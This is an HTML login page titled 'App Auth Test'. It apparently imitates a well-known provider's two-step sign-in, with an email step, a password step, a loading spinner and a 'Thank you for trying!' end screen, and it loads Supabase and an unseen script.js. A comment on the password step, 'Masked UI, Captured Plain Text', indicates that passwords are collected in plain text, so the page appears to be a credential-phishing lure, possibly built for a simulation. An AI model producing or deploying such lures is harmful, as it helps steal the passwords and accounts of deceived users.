<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>App Auth Test</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>

  <!-- Landing View -->
  <div id="landing-view" class="landing-card">
    <button class="btn" id="btn-open-login">Log in</button>
  </div>

  <!-- Login Card Flow (2-Column Grid) -->
  <div id="login-view" class="split-card hidden">
    
    <!-- LEFT COLUMN: Logo, Title, Privacy Notice / Email Chip -->
    <div class="left-col">
      <div>
        <img src="htu.png" alt="Logo" class="logo">
        <h2 class="title" id="side-title">Sign In</h2>
      </div>
      
      <!-- Step 1 Privacy Notice -->
      <p class="privacy-notice" id="privacy-notice">
        <span class="line-one">with your Account to continue. This account will be</span><br>
        available in the browser.
      </p>

      <!-- Step 2 Unclickable Email Badge -->
      <div class="email-chip hidden" id="email-chip">
        <svg class="chip-icon" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-3.8-.85-5.05-2.2.04-1.67 3.33-2.6 5.05-2.6s5.01.93 5.05 2.6C15.8 19.15 14.03 20 12 20z"/>
        </svg>
        <span class="chip-email" id="user-display-email"></span>
        <svg class="chip-arrow" viewBox="0 0 24 24" fill="currentColor">
          <path d="M7 10l5 5 5-5z"/>
        </svg>
      </div>
    </div>

    <!-- RIGHT COLUMN: Input Forms -->
    <div class="right-col">
      
      <!-- Step 1: Email Input -->
      <div id="step-email">
        <div class="form-group">
          <div class="input-container">
            <input type="email" id="email" placeholder=" ">
            <label for="email" class="floating-label">Email or phone</label>
          </div>
          <div class="error-msg" id="email-error">Please enter a valid email address.</div>
        </div>
        <button class="btn" id="btn-next">Next</button>
      </div>

      <!-- Step 2: Password Input (Masked UI, Captured Plain Text) -->
      <div id="step-password" class="hidden">
        <div class="form-group">
          <div class="input-container">
            <input type="password" id="password" placeholder=" ">
            <label for="password" class="floating-label">Enter your password</label>
          </div>

          <div class="show-password-wrapper">
            <input type="checkbox" id="toggle-password">
            <label for="toggle-password">Show password</label>
          </div>

          <div class="error-msg" id="pass-error">Password is required.</div>
        </div>
        
        <button class="btn" id="btn-login">Next</button>
      </div>

      <!-- Step 3: Loading State -->
      <div id="step-loading" class="hidden text-center">
        <div class="spinner"></div>
        <p style="font-weight: 500;">Signing in...</p>
        <p class="user-email-display" id="loading-display-email" style="margin-top: 8px;"></p>
      </div>

    </div>

  </div>

  <!-- Home View -->
  <div id="home-view" class="hidden">
    <h1 class="hero-text">Thank you for trying!</h1>
  </div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script src="script.js"></script>
</body>
</html>
